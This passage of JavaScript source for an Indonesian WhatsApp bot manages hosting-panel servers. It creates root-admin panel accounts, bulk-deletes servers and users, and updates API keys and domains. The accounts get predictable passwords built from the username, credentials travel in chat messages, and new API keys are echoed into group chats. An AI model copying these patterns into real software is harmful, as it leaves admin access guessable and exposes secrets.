 await fs.writeFileSync("./library/database/owner.json", JSON.stringify(owners, null, 2))

 if (added === 0) {
 Reply("Semua member grup ini sudah menjadi owner sebelumnya.")
 } else {
 Reply(`Berhasil menambah ${added} member sebagai owner bot ✅`)
 }
}
break

//=========================================//

case "delownerall": {
 if (!isCreator) return Reply(mess.owner);

 // Pastikan database ada sebelum mencoba menghapus
 if (!Array.isArray(owners) || owners.length === 0) {
 return Reply("Tidak ada owner tambahan yang terdaftar saat ini!");
 }

 // Buat salinan baru dari daftar owner, hanya menyisakan owner utama
 let updatedOwners = owners.filter(owner => owner === global.owner);

 // Simpan perubahan ke file database
 try {
 await fs.writeFileSync("./library/database/owner.json", JSON.stringify(updatedOwners, null, 2));
 
 // Perbarui daftar owner di dalam program
 owners.length = 0; // Kosongkan array asli
 owners.push(...updatedOwners); // Tambahkan kembali owner utama
 
 Reply("Semua owner tambahan telah berhasil dihapus ✅");
 } catch (err) {
 console.error("Error saat menyimpan database:", err);
 Reply("Terjadi kesalahan saat menghapus owner ❌");
 }
}
break

//=========================================//

case "setnamabot": {
 if (!isCreator) return Reply(mess.owner) // hanya creator yang bisa pakai

 if (!q) return Reply('Masukkan nama baru untuk bot!\nContoh: setnamabot MyBotBaru') // jika tidak ada argumen
 
 try {
 await conn.updateProfileName(q) // mengubah nama profil bot
 Reply(`Berhasil mengganti nama bot menjadi *${q}* ✅`)
 } catch (e) {
 console.error(e)
 Reply('Gagal mengganti nama bot ❌')
 }
}
break

//=========================================//

case "setbiobot": {
 if (!isCreator) return Reply(mess.owner)
 if (!text) return Reply(`Contoh penggunaan:\n${prefix}setbiobot Teks Bio Baru`)
 try {
 await conn.updateProfileStatus(text) // fungsi untuk ganti bio di WhatsApp
 Reply("Berhasil mengganti bio bot ✅")
 } catch (err) {
 console.log(err)
 Reply("Gagal mengganti bio bot ❌")
 }
}
break

//=========================================//

case "spekvps": {
if (!isCreator) return Reply(`❌ *Akses Ditolak!*\nHanya *Developer* yang dapat mengakses informasi ini.`);
    // Menghitung waktu runtime bot
    const botRuntime = runtime(process.uptime());
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let tio = await nou.os.oos();
    var tot = await nou.drive.info();
Reply(`🔴 *Informasi Server:*\n🖥️ *Platform:* ${nou.os.type()}\n💾 *Total RAM:* ${formatp(os.totalmem())}\n🗄️ *Total Disk:* ${tot.totalGb} GB\n⚙️ *Total CPU:* ${os.cpus().length} Core\n🔄 *Runtime VPS:* ${runtime(os.uptime())}\n⚡ *Respon Speed:* ${latensi.toFixed(4)} detik\n\n© 2025 ${global.botname2}`)
}
break

//=========================================//

case "buatgc":
case "creategc":
 if (!isCreator) return Reply(mess.owner)
 if (!isPc) return Reply(`*[ Akses Ditolak ]*\n*Perintah ini hanya bisa digunakan di Private Chat!*`)
 if (!text.includes('|')) return Reply(`*Contoh Penggunaan*:\n${prefix+command} Nama Group | Bio Group`)

 let [groupName, groupBio] = text.split('|').map(v => v.trim());

 if (!groupName || !groupBio) return Reply(`*Contoh Penggunaan*:\n${prefix+command} Nama Group | Bio Group`)

 try {
 let creat = await conn.groupCreate(groupName, [])
 let kiya = await conn.groupInviteCode(creat.id)

 // Mengatur deskripsi grup (bio)
 await conn.groupUpdateDescription(creat.id, groupBio)

 let groupLink = `https://chat.whatsapp.com/${kiya}`
 let message = `✅ *SUKSES MEMBUAT GROUP* ✅\n\n📌 *Nama:* ${groupName}\n📝 *Bio:* ${groupBio}\n🔗 *Link:* ${groupLink}`

 await conn.sendMessage(m.chat, { text: message })
 Reply('✅ Pesan dan link grup telah terkirim ke chat Anda!')

 } catch (error) {
 console.error(error)
 Reply('❌ Gagal membuat grup. Pastikan akun memiliki izin untuk membuat grup!')
 }
 break

//=========================================//

case "cadmin-v1": {
  if (!isCreator) return Reply(mess.owner);

  let data = global.tempCadmin?.[m.sender];
  if (!data) return Reply("❌ Data tidak ditemukan. Ketik `.cadmin nama,nomor` dulu.");

  delete global.tempCadmin[m.sender];

  let username = data.username;
  let email = username + "@gmail.com";
  let password = username + "v1admin";

  let res = await fetch(global.domain + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikey
    },
    body: JSON.stringify({
      email,
      username,
      first_name: data.name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let json = await res.json();
  if (json.errors) return Reply("❌ Error V1: " + JSON.stringify(json.errors[0], null, 2));

  let user = json.attributes;

  let tujuan = data.nomor + "@s.whatsapp.net";
  let teks = `
✅ *Admin Panel V1 Berhasil Dibuat*

🆔 ID: ${user.id}
👤 Nama: ${data.name}
💻 Username: ${username}
🔐 Password: ${password}
🌐 Panel: ${global.domain}

📞 Kontak: wa.me/${data.nomor}

*📜 Rules Admin Panel ⚠️*
1️⃣ Jangan Maling SC, Ketahuan? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 10 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti SS Chat Saat Pembelian
 `.trim();

  // Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(tujuan, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domain}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: tujuan, quoted: m });

  await conn.relayMessage(tujuan, msg.message, { messageId: msg.key.id });

  // Notifikasi ke pengirim command
  await conn.sendMessage(m.chat, {
    text: `✅ Akun admin berhasil dibuat & sudah dikirim ke nomor: wa.me/${data.nomor}`
  }, { quoted: m });
}
break

//=========================================//

case "cadmin-v2": {
  if (!isCreator) return Reply(mess.owner);

  let data = global.tempCadmin?.[m.sender];
  if (!data) return Reply("❌ Data tidak ditemukan. Ketik `.cadmin nama,nomor` dulu.");

  delete global.tempCadmin[m.sender];

  let username = data.username;
  let email = username + "@gmail.com";
  let password = username + "v2admin";

  let res = await fetch(global.domainV2 + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    },
    body: JSON.stringify({
      email,
      username,
      first_name: data.name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let json = await res.json();
  if (json.errors) return Reply("❌ Error V2: " + JSON.stringify(json.errors[0], null, 2));

  let user = json.attributes;

  let tujuan = data.nomor + "@s.whatsapp.net";
  let teks = `
✅ *Admin Panel V2 Berhasil Dibuat*

🆔 ID: ${user.id}
👤 Nama: ${data.name}
💻 Username: ${username}
🔐 Password: ${password}
🌐 Panel: ${global.domainV2}

📞 Kontak: wa.me/${data.nomor}

*📜 Rules Admin Panel ⚠️*
1️⃣ Jangan Maling SC, Ketahuan? Auto Delete Akun & No Reff!!
2️⃣ Simpan Baik-Baik Data Akun Ini
3️⃣ Buat Panel Seperlunya Aja, Jangan Asal Buat!
4️⃣ Garansi Aktif 10 Hari
5️⃣ Claim Garansi Wajib Membawa Bukti SS Chat Saat Pembelian
 `.trim();

  // Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(tujuan, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domainV2}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: tujuan, quoted: m });

  await conn.relayMessage(tujuan, msg.message, { messageId: msg.key.id });

  // Notifikasi ke pengirim command
  await conn.sendMessage(m.chat, {
    text: `✅ Akun admin berhasil dibuat & sudah dikirim ke nomor: wa.me/${data.nomor}`
  }, { quoted: m });
}
break

//=========================================//

case "cadp": {
 if (!isCreator) return Reply(mess.owner);
 if (!text) return Reply(example("masukkan username"));

 // Simpan username sementara di user session (simple pakai global object)
 global.tempUser = global.tempUser || {};
 global.tempUser[m.sender] = text;

 await conn.sendMessage(m.chat, {
 caption: `🖲 Username: *${text}*\nSilakan pilih versi server untuk membuat akun Admin Panel:`,
 image: { url: global.image.reply },
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'pilih_server_admin',
 buttonText: { displayText: '🌐 Pilih Server' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🛠️ Pilih Server Panel',
 sections: [
 {
 title: '📁 Buat Admin Panel',
 rows: [
 {
 title: '🌐 Panel Server V1',
 description: '🔹 Buat akun admin di server V1',
 id: '.cadp-v1'
 },
 {
 title: '🌐 Panel Server V2',
 description: '🔹 Buat akun admin di server V2',
 id: '.cadp-v2'
 }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: m });
}
break

//=========================================//

case "cadp-v1": {
  if (!isCreator) return Reply(mess.owner);

  let username = global.tempUser?.[m.sender];
  if (!username) return Reply("❌ Username tidak ditemukan. Ketik `.cadp <username>` terlebih dahulu.");

  delete global.tempUser[m.sender]; // hapus setelah dipakai
  let email = username + "@gmail.com";
  let name = capital(username);
  let password = username + "Fyzz";

  let f = await fetch(global.domain + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikey
    },
    body: JSON.stringify({
      email,
      username,
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let data = await f.json();
  if (data.errors) return Reply("❌ Error V1: " + JSON.stringify(data.errors[0], null, 2));

  let user = data.attributes;
  let orang = m.isGroup ? m.sender : m.chat;
  if (m.isGroup) await Reply("✅ *Admin Panel V1 berhasil dibuat!* \nData akun sudah dikirim ke private chat.");

  let teks = `
*✅ Admin Panel V1 Berhasil Dibuat*

*🆔 ID:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔐 Password:* ${password}
*🌐 Login:* ${global.domain}

📜 *Rules Admin Panel ⚠️*
1️⃣ Jangan maling SC! Ketahuan? Akun dihapus!
2️⃣ Simpan baik-baik data akun ini
3️⃣ Jangan spam bikin panel
4️⃣ Garansi: 10 hari
5️⃣ Claim garansi wajib bawa bukti SS chat
  `.trim();

  // ✅ Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(orang, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${user.username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domain}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: orang, quoted: m });

  await conn.relayMessage(orang, msg.message, { messageId: msg.key.id });
}
break;

//=========================================//

case "cadp-v2": {
  if (!isCreator) return Reply(mess.owner);

  let username = global.tempUser?.[m.sender];
  if (!username) return Reply("❌ Username tidak ditemukan. Ketik `.cadp <username>` terlebih dahulu.");

  delete global.tempUser[m.sender]; // hapus setelah dipakai
  let email = username + "@gmail.com";
  let name = capital(username);
  let password = username + "Fyzz";

  let f = await fetch(global.domainV2 + "/api/application/users", {
    method: "POST",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + global.apikeyV2
    },
    body: JSON.stringify({
      email,
      username,
      first_name: name,
      last_name: "Admin",
      root_admin: true,
      language: "en",
      password
    })
  });

  let data = await f.json();
  if (data.errors) return Reply("❌ Error V1: " + JSON.stringify(data.errors[0], null, 2));

  let user = data.attributes;
  let orang = m.isGroup ? m.sender : m.chat;
  if (m.isGroup) await Reply("✅ *Admin Panel V2 berhasil dibuat!* \nData akun sudah dikirim ke private chat.");

  let teks = `
*✅ Admin Panel V2 Berhasil Dibuat*

*🆔 ID:* ${user.id}
*👤 Nama:* ${user.first_name}
*💻 Username:* ${user.username}
*🔐 Password:* ${password}
*🌐 Login:* ${global.domainV2}

📜 *Rules Admin Panel ⚠️*
1️⃣ Jangan maling SC! Ketahuan? Akun dihapus!
2️⃣ Simpan baik-baik data akun ini
3️⃣ Jangan spam bikin panel
4️⃣ Garansi: 10 hari
5️⃣ Claim garansi wajib bawa bukti SS chat
  `.trim();

  // ✅ Kirim pakai nativeFlowMessage
  let msg = await generateWAMessageFromContent(orang, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: { mentionedJid: [m.sender] },
          body: proto.Message.InteractiveMessage.Body.create({ text: teks }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"📋 Copy Username","copy_code":"${user.username}"}` },
              { "name": "cta_copy", "buttonParamsJson": `{"display_text":"🔐 Copy Password","copy_code":"${password}"}` },
              { "name": "cta_url", "buttonParamsJson": `{"display_text":"🌐 Buka Panel","url":"${global.domainV2}"}` }
            ]
          })
        })
      }
    }
  }, { userJid: orang, quoted: m });

  await conn.relayMessage(orang, msg.message, { messageId: msg.key.id });
}
break;

//=========================================//

case "upapikey-v1": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} API_KEY_KAMU`);
  }

  global.apikey = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *API Key untuk Server V1 berhasil diupdate!*\n\n🔑 *API Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan API Key V1*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

//=========================================//

case "updomain-v1": {
 const newDomain = args[0]; // ✅ Ambil langsung dari argumen command

 if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

 if (!newDomain) {
 return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://domain.com`);
 }

 global.domain = newDomain; // ✅ Simpan sebagai variabel global

 const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

 Reply(`✅ *Domain untuk Server V1 berhasil diupdate!*\n\n🌐 *${newDomain}*`);

 // Kirim notifikasi ke owner
 const ownerJid = `${global.owner}@s.whatsapp.net`;
 conn.sendMessage(ownerJid, {
 text: `📢 *Perubahan Domain Server V1*\n\n🌐 *Domain Baru:* ${newDomain}\n🕒 *Waktu:* ${waktu}`,
 });
}
break

//=========================================//

case "upcapikey": {
 if (!args[0]) return m.reply('❗ Masukkan Caddy API Key!\nContoh: *.upcapikey API_KEY_CADDY*');

 const caddyKey = args[0];

 await conn.sendMessage(m.chat, {
 caption: `🔐 Caddy API Key yang akan diupdate:\n${caddyKey}\n\nSilakan pilih server tempat API Key akan diterapkan:`,
 image: { url: global.image.reply },
 footer: `© 2025 ${botname} 🚀`,
 buttons: [
 {
 buttonId: 'update_capikey',
 buttonText: { displayText: '🔐 Pilih Server' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🔐 Pilih Server',
 sections: [
 {
 title: '📁 Update Caddy API Key ke Server',
 rows: [
 {
 title: '🛠️ Server V1',
 description: '🔹 Update ke server V1',
 id: `.upcapikey-v1 ${caddyKey}`
 },
 {
 title: '🛠️ Server V2',
 description: '🔹 Update ke server V2',
 id: `.upcapikey-v2 ${caddyKey}`
 }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: qtext2 });
}
break

//=========================================//

case "upapikey": {
 if (!args[0]) return m.reply('❗ Masukkan API Key!\nContoh: *.upapikey API_KEY_KAMU*');

 const apiKey = args[0];

 await conn.sendMessage(m.chat, {
 caption: `🔐 API Key yang akan diupdate:\n${apiKey}\n\nSilakan pilih server tempat API Key akan diterapkan:`,
 image: { url: global.image.reply },
 footer: `© 2025 ${botname} 🚀`,
 buttons: [
 {
 buttonId: 'update_apikey',
 buttonText: { displayText: '🔐 Pilih Server' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🔐 Pilih Server',
 sections: [
 {
 title: '📁 Update API Key ke Server',
 rows: [
 {
 title: '🛠️ Server V1',
 description: '🔹 Update API Key ke server V1',
 id: `.upapikey-v1 ${apiKey}`
 },
 {
 title: '🛠️ Server V2',
 description: '🔹 Update API Key ke server V2',
 id: `.upapikey-v2 ${apiKey}`
 }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: qtext2 });
}
break

//=========================================//

case "updomain": {
 if (!args[0]) return m.reply('❗ Masukkan link domain!\nContoh: *.updomain https://namadomain.com*');

 const linkDomain = args[0]; // ✅ Didefinisikan di sini

 await conn.sendMessage(m.chat, {
 caption: `🌐 Domain yang akan diupdate:\n${linkDomain}\n\nSilakan pilih server tempat domain akan diterapkan:`,
 image: { url: global.image.reply },
 footer: `© 2025 ${botname} 🚀`,
 buttons: [
 {
 buttonId: 'update_domain',
 buttonText: { displayText: '🔧 Pilih Server' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '🌐 Pilih Server',
 sections: [
 {
 title: '📁 Update Domain ke Server',
 rows: [
 {
 title: '🌐 Server V1',
 description: '🔹 Update domain ke server V1',
 id: `.updomain-v1 ${linkDomain}` // ✅ linkDomain sudah aman digunakan
 },
 {
 title: '🌐 Server V2',
 description: '🔹 Update domain ke server V2',
 id: `.updomain-v2 ${linkDomain}`
 }
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: qtext2 });
}
break

//=========================================//

case "clearall": {
if (!isCreator) return m.reply(mess.owner)

    try {
        // Ambil semua server
        let serverFetch = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let serverRes = await serverFetch.json();
        let servers = serverRes.data;

        if (!servers || servers.length === 0) {
            Reply('Tidak ada server yang ditemukan.');
        } else {
            // Loop melalui setiap server dan menghapusnya
            for (let server of servers) {
                let s = server.attributes;

                let deleteServer = await fetch(domain + "/api/application/servers/" + s.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey,
                    }
                });

                if (deleteServer.ok) {
                    Reply(`*Berhasil menghapus server dengan ID: ${s.id}*`);
                } else {
                    let errorText = await deleteServer.text();
                    Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
                }
            }
            Reply('*Semua server berhasil dihapus!*');
        }

        // Ambil semua user
        let userFetch = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let userRes = await userFetch.json();
        let users = userRes.data;

        if (!users || users.length === 0) {
            Reply('Tidak ada user yang ditemukan.');
        } else {
            // Loop melalui setiap user dan hapus jika bukan admin
            for (let user of users) {
                let u = user.attributes;

                if (!u.root_admin) {
                    let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                        method: "DELETE",
                        headers: {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikey,
                        }
                    });

                    if (deleteUser.ok) {
                        Reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
                    } else {
                        let errorText = await deleteUser.text();
                        Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
                    }
                }
            }
            Reply('*Semua user kecuali admin berhasil dihapus!*');
        }
        
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
}
break

//=========================================//

case "upcapikey-v2": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CADDY_API_KEY`);
  }

  global.capikeyV2 = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *Caddy API Key untuk Server V2 berhasil diupdate!*\n\n🔐 *Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan Caddy API Key V2*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

//=========================================//

case "upapikey-v2": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} API_KEY_KAMU`);
  }

  global.apikeyV2 = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *API Key untuk Server V2 berhasil diupdate!*\n\n🔑 *API Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan API Key V2*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

//=========================================//

case "updomain-v2": {
 const newDomain = args[0]; // ✅ Ambil langsung dari argumen command

 if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

 if (!newDomain) {
 return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} https://domain.com`);
 }

 global.domainV2 = newDomain; // ✅ Simpan sebagai variabel global

 const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

 Reply(`✅ *Domain untuk Server V2 berhasil diupdate!*\n\n🌐 *${newDomain}*`);

 // Kirim notifikasi ke owner
 const ownerJid = `${global.owner}@s.whatsapp.net`;
 conn.sendMessage(ownerJid, {
 text: `📢 *Perubahan Domain Server V2*\n\n🌐 *Domain Baru:* ${newDomain}\n🕒 *Waktu:* ${waktu}`,
 });
}
break

//=========================================//

case "upcapikey-v1": {
  const newKey = args[0];

  if (!isCreator) return Reply("❌ *Akses ditolak! Perintah ini hanya untuk pemilik bot.*");

  if (!newKey) {
    return Reply(`⚠️ *Format salah!*\n\n📌 *Contoh:* ${prefix + command} CADDY_API_KEY`);
  }

  global.capikey = newKey;

  const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
  const notifText = `✅ *Caddy API Key untuk Server V1 berhasil diupdate!*\n\n🔐 *Key Baru:* ${newKey}\n🕒 *Waktu:* ${waktu}`;

  Reply(notifText);

  const ownerJid = `${global.owner}@s.whatsapp.net`;
  conn.sendMessage(ownerJid, { text: `📢 *Perubahan Caddy API Key V1*\n\n${notifText}` });

  if (m.chat.endsWith('@g.us')) {
    conn.sendMessage(m.chat, { text: `📢 *[Bot Log]*\n${notifText}` });
  }
}
break;

//=========================================//

case "clearall-v2": {
if (!isCreator) return m.reply(mess.owner)

    try {
        // Ambil semua server
        let serverFetch = await fetch(domainV2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikeyV2,
            }
        });

        let serverRes = await serverFetch.json();
        let servers = serverRes.data;

        if (!servers || servers.length === 0) {
            Reply('Tidak ada server yang ditemukan.');
        } else {
            // Loop melalui setiap server dan menghapusnya
            for (let server of servers) {
                let s = server.attributes;

                let deleteServer = await fetch(domainV2 + "/api/application/servers/" + s.id, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikeyV2,
                    }
                });

                if (deleteServer.ok) {
                    Reply(`*Berhasil menghapus server dengan ID: ${s.id}*`);
                } else {
                    let errorText = await deleteServer.text();
                    Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
                }
            }
            Reply('*Semua server berhasil dihapus!*');
        }

        // Ambil semua user
        let userFetch = await fetch(domainV2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikeyV2,
            }
        });

        let userRes = await userFetch.json();
        let users = userRes.data;

        if (!users || users.length === 0) {
            Reply('Tidak ada user yang ditemukan.');
        } else {
            // Loop melalui setiap user dan hapus jika bukan admin
            for (let user of users) {
                let u = user.attributes;

                if (!u.root_admin) {
                    let deleteUser = await fetch(domainV2 + "/api/application/users/" + u.id, {
                        method: "DELETE",
                        headers: {
                            "Accept": "application/json",
                            "Content-Type": "application/json",
                            "Authorization": "Bearer " + apikeyV2,
                        }
                    });

                    if (deleteUser.ok) {
                        Reply(`*Berhasil menghapus user dengan ID: ${u.id}*`);
                    } else {
                        let errorText = await deleteUser.text();
                        Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
                    }
                }
            }
            Reply('*Semua user kecuali admin berhasil dihapus!*');
        }
        
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
}
break

//=========================================//

case "aksesgrp-v2": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup2.json';

 if (!args[0]) return Reply("❌ ID grup tidak ditemukan.");
 let grupId = global.cacheGrupAkses?.[args[0]];

 if (!grupId) return Reply("❌ Grup tidak ditemukan dalam cache.");

 // Baca data lama
 let data = [];
 if (fs.existsSync(filePath)) {
 try {
 data = JSON.parse(fs.readFileSync(filePath));
 } catch (e) {
 data = [];
 }
 }

 if (data.includes(grupId)) return Reply("⚠️ Grup ini sudah punya akses.");

 data.push(grupId);
 fs.writeFileSync(filePath, JSON.stringify(data, null, 2));

 Reply(`✅ *Berhasil menambahkan akses ke grup!*\n🆔: ${grupId}`);
}
break

//=========================================//

case "addakses-v2": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup2.json';

 // Pastikan data grup tersedia
 let allChats = await conn.groupFetchAllParticipating();
 let groups = Object.entries(allChats).map(([jid, data]) => ({
 id: jid,
 name: data.subject || 'Tanpa Nama',
 }));

 if (!groups.length) return Reply("❌ Bot tidak ada di grup manapun.");

 // Simpan grup sementara di cache global
 global.cacheGrupAkses = {};
 let sections = [
 {
 title: '🛡️ Pilih Grup Untuk Diberi Akses',
 rows: groups.map((g, i) => {
 global.cacheGrupAkses[`akses_${i}`] = g.id;
 return {
 title: g.name,
 description: g.id,
 id: `.aksesgrp-v2 akses_${i}`
 };
 })
 }
 ];

 await conn.sendMessage(m.chat, {
 caption: "Silakan pilih grup yang ingin diberi akses:",
 image: { url: global.image.reply },
 footer: `© ${botname} 2025`,
 buttons: [
 {
 buttonId: 'pilih_grup_akses',
 buttonText: { displayText: '📂 Pilih Grup' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: '📌 Pilih Grup Akses',
 sections
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true
 }, { quoted: m });
}
break

//=========================================//

case "aksesgrp": {
 if (!isCreator) return Reply(mess.owner);

 const fs = require('fs');
 const filePath = './library/database/idgrup.json';

 if (!args[0]) return Reply("❌ ID grup tidak ditemukan.");
 let grupId = global.cacheGrupAkses?.[args[0]];

 if (!grupId) return Reply("❌ Grup tidak ditemukan dalam cache.");

 // Baca data lama
 let data = [];
 if (fs.existsSync(filePath)) {
 try {
 data = JSON.parse(fs.readFileSync(filePath));
 } catch (e) {
 data = [];
 }
 }

 if (data.includes(grupId)) return Reply("⚠️ Grup ini sudah punya akses.");

 data.push(grupId);
